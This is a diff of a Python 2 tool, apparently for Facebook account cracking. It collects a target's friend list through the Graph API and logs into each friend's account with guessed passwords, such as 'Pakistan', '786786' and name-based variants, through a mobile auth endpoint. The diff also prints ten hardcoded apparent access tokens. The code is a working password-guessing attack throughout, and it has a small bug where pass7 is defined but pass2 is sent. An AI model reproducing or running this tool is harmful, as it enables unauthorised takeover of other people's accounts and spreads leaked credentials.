@@ -1,17 +1,17 @@
- #coding:utf-8
+#coding:utf-8
 #!/user/bin/python2
 #coding by Zakarya
 try:    
     import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,mechanize,requests
-    from multiprocessing import ThreadPool
+    from multiprocessing.pool import ThreadPool
     from requests.exceptions import ConnectionError
     from mechanize import Browser
 except ImportError:
     os.system('pip2 install requests')
     os.system('pip2 install mechanize')
-    os.system('python2 Acid.py')
+    os.system('python2 Clone.py')
 try:
-    os.mkdir('FUCK')
+    os.mkdir('Clone')
 except OSError:
     pass
 
@@ -33,6 +33,8 @@ def acak(b):
         d += '!'+w[random.randint(0,len(w)-1)]+i
         return cetak(d)
         
+
+
 #### colours ####
 B='\033[1;94m'
 R='\033[1;91m'
@@ -86,8 +88,7 @@ def logmen():
     os.system('clear')
     print logo
     print ' [1] Login Token'
-    print ' [2] Get Free Token'
-    print ' [\x1b[91m0\x1b[0m] Exit Tool'
+    print ' [\x1b[91m0\x1b[0m] Gajadi Pake'
     pilog()
 def pilog():
     og = raw_input("\nZKI: ")
@@ -95,53 +96,19 @@ def pilog():
         os.system("clear")
         print logo
         print 
+        print ("Copy Token For Free  : Token No 1.  EAAAAUaZA8jlABAFJSFhiG1E3EhbRtzldAcYO2ZC0IFsRr0xXbtaBFBvajLoZA6h4ptDpgZBnxx7T7FaGtrWY6BZBDjkrmwVn85gpJZC7WUseC0SKqhuXWad8VLug8t6DPclZBKjIMsEByeQVU2tWb4e23cJ14aBvSrCGpDPMpmLwZAkNlejJDe0BlquZA8w6tyvcZD.     Token No 2.  EAAAAUaZA8jlABAJG16Q43JxgMU7ZCM15CfxarUlCKCOPja0vsgwL2wU8l9pccRJtSjHFQtl0VRe2wYTbX0Q4a2QHLSC3J8ERPdF9JnZARyqsBIjCHRnvJSSWLwa9r619dxFWpkZCHOfZCZAZCkW7YI6ahZAx7d6efkOn4OQ1fGflwfZA9yHPymaNgnvRwve3R7gwZD.  Token No 3. EAAAAUaZA8jlABAAEZBfLBJqy1wcYLWoyTA7ybcUFBh8PivYocWqULQvLIO67AFUiEgXDOB3jXDmO1AfuCrwXHxZCyOxi2WrM6XE0ZCfZB8106w4X4JZCvZBWBrIlNFAy9ZC0iHJb5GbIpEJTS1cDcLAN8JiGohgSEeAp0NkPEZBF7qcXwCh2jDhD6PN29WZBmZB7M8.  Token No 4. EAAAAUaZA8jlABAFQtEdT93913TLUr7amsfmhG626dHdiCS8TSTZCrS3WF75I6ws5DIhHRpfvZABsY3ZBZA8xtQBr07g1GlAgAm9fTPtWFZBkEPuRcSykoG29ps93FeyUPYLO9EZCmwJKaDC34Adtfw9UhwyZCAsAzsbg10x6AnF4ZAsjZCUVvKiqEkVlZCgiC4pq70ZD. Token No 5. EAAAAUaZA8jlABAFkG7vMxCYgTbJffsscQr81AZAGuUuI53rFtJw5l8d8B8KFZAZC6WaZBGNlEpeKr6vZBdAGtI1d4P7K1ZANqybcXiM6N3uYV7pj3OaZCcoEnXWcpcVdxgqaSvYZAvsvKjS5gy3RzqfidnJRAsDxrsu1zNS9NWdTPE0AzFThU1HZA2. Token No 6. EAAAAUaZA8jlABAEfw8ZB3QDG0S5JT1mhtrywBwqNfZAn6x2FzwwxGbi1LpdUjDvFZCd2D2fgvLFnnVPtVQZCbMb1fYqqT0Cps80c6F6Ol8OQbdcvXYHGGgReN9SBDU6zmlVZBWCj1ZBnxkZA239ZBZCJw56iiaemOrn5Ng9WaB79iLYxiCxN6iYd8EFnOLZCAfd58UZ.  Token No 7. EAAAAUaZA8jlABAHwl2zyIWGPyQ588SFvkoV5YwxdGQiCb1FEGxnVP6RZCM8Mk34UsedfSRkcMSUeGFX79nu7E0guCmmRI2vtTqDOi8zoIIL506ZBNCRFhXq8srDL4aIwKJzepP9OYyQMJZClqsZBRNWKTPSF47ALYEhira99sZASVXbtaZBAzslUeY5KdZCCEGUZD. Token No 8. EAAAAUaZA8jlABADnu0YhuZAewgeVOcZCNf1tDxVWnMhiMF6wVOwHIMolqQZA8G3yLnhUOswVSY8rehNpldW2cWYYzXtqdE6eQtB0wfWVfqhd1ZBTBsdqFTkvzGXdL5hNqq9qjkIBPkRTvql5cZCy4ytbeEwWdaYUhwqj8OcBK42eV0AxRCvu1TvSxn3t4e4.  Token No 9. EAAAAUaZA8jlABADE0UlMZB9sHz2mt1TO4UABZBGL68X3dk8XUmGvBf7KOpaBeZBPwMMQHDcQfuZCQwqLkXL8wCZCtazvLSimCQZCQbZChwzZAjJZBvma6HMemJp2GzyX00wvzY6wlbfJm7mGaktSEJXhGUKfXcoDofg4m7o0CPqJBekjGsoNiSTJpe1kAV5bnFANEZD. Token No 10. EAAAAUaZA8jlABAGuUuqZCKpJlU9ZCJhHwuhyZCHsaBDjrxvuxMx6JHxdtQaTWg7HvEcMJBOPaw0Wo187IaVvP2Sx8CORxD2wD3FcYzYuqd0EFh2Rn8y8BVjYBjtlV3KOaWwmUwvuf3znjI3sdvjuuGGCm5T8GpVAAJgCgdnkBGlsMGFT6LFCjyhWTueN6c4ZD")
+        print 
         token = raw_input("[+] Past Your Token Here : ")
-        sav = open(".logfuck.txt","w")
+        sav = open(".logacid.txt","w")
         sav.write(token)
         sav.close()
-        print ("\r\033[1;32m[✓] Login Succesfully\033[0;97m")
+        print ("\r\033[1;32m[✓] Login Successfully\033[0;97m")
         time.sleep(1)
         bot_fl()
-    elif og =="2":
-             os.system("clear")
-        print 
-        print logo="""
- Token No 1
-
-EAAAAUaZA8jlABAFJSFhiG1E3EhbRtzldAcYO2ZC0IFsRr0xXbtaBFBvajLoZA6h4ptDpgZBnxx7T7FaGtrWY6BZBDjkrmwVn85gpJZC7WUseC0SKqhuXWad8VLug8t6DPclZBKjIMsEByeQVU2tWb4e23cJ14aBvSrCGpDPMpmLwZAkNlejJDe0BlquZA8w6tyvcZD
-
- Token No 2
-
-EAAAAUaZA8jlABAJG16Q43JxgMU7ZCM15CfxarUlCKCOPja0vsgwL2wU8l9pccRJtSjHFQtl0VRe2wYTbX0Q4a2QHLSC3J8ERPdF9JnZARyqsBIjCHRnvJSSWLwa9r619dxFWpkZCHOfZCZAZCkW7YI6ahZAx7d6efkOn4OQ1fGflwfZA9yHPymaNgnvRwve3R7gwZD
-
- Token No 3
-EAAAAUaZA8jlABAAEZBfLBJqy1wcYLWoyTA7ybcUFBh8PivYocWqULQvLIO67AFUiEgXDOB3jXDmO1AfuCrwXHxZCyOxi2WrM6XE0ZCfZB8106w4X4JZCvZBWBrIlNFAy9ZC0iHJb5GbIpEJTS1cDcLAN8JiGohgSEeAp0NkPEZBF7qcXwCh2jDhD6PN29WZBmZB7M8
-
- Token No 4
-EAAAAUaZA8jlABAFQtEdT93913TLUr7amsfmhG626dHdiCS8TSTZCrS3WF75I6ws5DIhHRpfvZABsY3ZBZA8xtQBr07g1GlAgAm9fTPtWFZBkEPuRcSykoG29ps93FeyUPYLO9EZCmwJKaDC34Adtfw9UhwyZCAsAzsbg10x6AnF4ZAsjZCUVvKiqEkVlZCgiC4pq70ZD
-
- Token No 5
-EAAAAUaZA8jlABAFkG7vMxCYgTbJffsscQr81AZAGuUuI53rFtJw5l8d8B8KFZAZC6WaZBGNlEpeKr6vZBdAGtI1d4P7K1ZANqybcXiM6N3uYV7pj3OaZCcoEnXWcpcVdxgqaSvYZAvsvKjS5gy3RzqfidnJRAsDxrsu1zNS9NWdTPE0AzFThU1HZA2
-
- Token No 6
-EAAAAUaZA8jlABAEfw8ZB3QDG0S5JT1mhtrywBwqNfZAn6x2FzwwxGbi1LpdUjDvFZCd2D2fgvLFnnVPtVQZCbMb1fYqqT0Cps80c6F6Ol8OQbdcvXYHGGgReN9SBDU6zmlVZBWCj1ZBnxkZA239ZBZCJw56iiaemOrn5Ng9WaB79iLYxiCxN6iYd8EFnOLZCAfd58UZD
-
- Token No 7
-EAAAAUaZA8jlABAHwl2zyIWGPyQ588SFvkoV5YwxdGQiCb1FEGxnVP6RZCM8Mk34UsedfSRkcMSUeGFX79nu7E0guCmmRI2vtTqDOi8zoIIL506ZBNCRFhXq8srDL4aIwKJzepP9OYyQMJZClqsZBRNWKTPSF47ALYEhira99sZASVXbtaZBAzslUeY5KdZCCEGUZD
-
- Token No 8
-EAAAAUaZA8jlABADnu0YhuZAewgeVOcZCNf1tDxVWnMhiMF6wVOwHIMolqQZA8G3yLnhUOswVSY8rehNpldW2cWYYzXtqdE6eQtB0wfWVfqhd1ZBTBsdqFTkvzGXdL5hNqq9qjkIBPkRTvql5cZCy4ytbeEwWdaYUhwqj8OcBK42eV0AxRCvu1TvSxn3t4e4
-
- Token No 9
-EAAAAUaZA8jlABADE0UlMZB9sHz2mt1TO4UABZBGL68X3dk8XUmGvBf7KOpaBeZBPwMMQHDcQfuZCQwqLkXL8wCZCtazvLSimCQZCQbZChwzZAjJZBvma6HMemJp2GzyX00wvzY6wlbfJm7mGaktSEJXhGUKfXcoDofg4m7o0CPqJBekjGsoNiSTJpe1kAV5bnFANEZD
-
- Token No 10
-EAAAAUaZA8jlABAGuUuqZCKpJlU9ZCJhHwuhyZCHsaBDjrxvuxMx6JHxdtQaTWg7HvEcMJBOPaw0Wo187IaVvP2Sx8CORxD2wD3FcYzYuqd0EFh2Rn8y8BVjYBjtlV3KOaWwmUwvuf3znjI3sdvjuuGGCm5T8GpVAAJgCgdnkBGlsMGFT6LFCjyhWTueN6c4ZD
-"""
     elif og =="0":
         exit()
     else:
-        print ("[!] Pilih Yang Bener Dong")
+        print ("[!] Select In The Above")
         pilog()
         
 def bot_fl():
@@ -159,7 +126,7 @@ def menu():
         token = open(".logfuck.txt","r").read()
     except IOError:
         print logo
-        print("[!] token error. token not found")
+        print("[!] Token Error or Toke Not Found")
         os.system("rm -rf .logfuck.txt")
         time.sleep(1)
         logmen()
@@ -170,21 +137,21 @@ def menu():
     except KeyError:
         os.system("clear")
         print logo
-        print("[!] Failed To Load. Your Checkpoint account")
+        print("[!] Fail To Load Your Account Is It Checkpiont")
         os.system("rm -rf .logfuck.txt")
         time.sleep(1)
         logmen()
     os.system("clear")
     print logo
     print("Welcome "+name)
-    print ("Please select")
+    print ("Please Select")
     print
-    print("[1] Start Cracking")
+    print("[1] Start Crack")
     print("[\x1b[91m0\x1b[0m] Exit")
     pil()
     
 def pil():
-    ti = raw_input('\nSelect: ')
+    ti = raw_input('\nZKI: ')
     if ti =='1':
         cramen()
     elif ti =='0':
@@ -194,7 +161,7 @@ def pil():
         os.system('exit')
         logmen()
     else:
-        print '[!] Pilih Yang Bener Dong'
+        print '[!] Chose Serious Please'
         pil()
         
 def cramen():
@@ -231,15 +198,15 @@ def crapil():
 	elif select =="1":
 		os.system("clear")
 		print logo
-		idt = raw_input("[+] Target ID : ")
+		idt = raw_input("[+] Enter Target ID : ")
 		os.system("clear")
 		print logo
 		try:
 			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
 			q = json.loads(r.text)
-			print("[✓] Name : "+q["name"])
+			print("[✓] Account name : "+q["name"])
 		except KeyError:
-			print('\n[!] Fb ID . ID : '+idt+' Friends Not Public')
+			print('\n[!] ID error . ID : '+idt+' Unlisted Friends')
 			raw_input("\nBack ")
 			cramen()
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
@@ -253,7 +220,7 @@ def crapil():
 	elif select =="0":
 		menu()
 	else:
-		print ("[!] Pilih Yang Bener Dong")
+		print ("[!] Chose Serious Please")
 		crapil()
 	print("[✓] Total ID : "+str(len(id)))
 	time.sleep(0.5)
@@ -264,7 +231,7 @@ def crapil():
 		user=arg
 		uid,name=user.split("|")
 		try:
-		    pass1='786786'
+		    pass1='Pakistan'
 		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		    d=json.loads(q)
 		    if 'www.facebook.com' in d['error_msg']:
@@ -281,7 +248,7 @@ def crapil():
 		            ok.close()
 		            oks.append(uid)
 		        else:
-		            pass2='Pakistan'
+		            pass2='name+"@#&+£"'
 		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		            d=json.loads(q)
 		            if 'www.facebook.com' in d['error_msg']:
@@ -315,7 +282,7 @@ def crapil():
 		                            ok.close()
 		                            oks.append(uid)
 		                        else:
-		                            pass4=name+"123"
+		                            pass4="786786"
 		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                            d=json.loads(q)
 		                            if 'www.facebook.com' in d['error_msg']:
@@ -332,7 +299,7 @@ def crapil():
 		                                    ok.close()
 		                                    oks.append(uid)
 		                                else:
-		                                    pass5=name+"12@#"
+		                                    pass5=name+"123@£#"
 		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                    d=json.loads(q)
 		                                    if 'www.facebook.com' in d['error_msg']:
@@ -349,7 +316,7 @@ def crapil():
 		                                            ok.close()
 		                                            oks.append(uid)
 		                                        else:
-		                                            pass6="1234567"
+		                                            pass6="Pakistan123"
 		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                            d=json.loads(q)
 		                                            if 'www.facebook.com' in d['error_msg']:
@@ -366,7 +333,7 @@ def crapil():
 		                                                    ok.close()
 		                                                    oks.append(uid)
 		                                                else:
-		                                                    pass7= "889900"
+		                                                    pass7= "1234567890"
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                                    d=json.loads(q)
 		                                                    if 'www.facebook.com' in d['error_msg']:
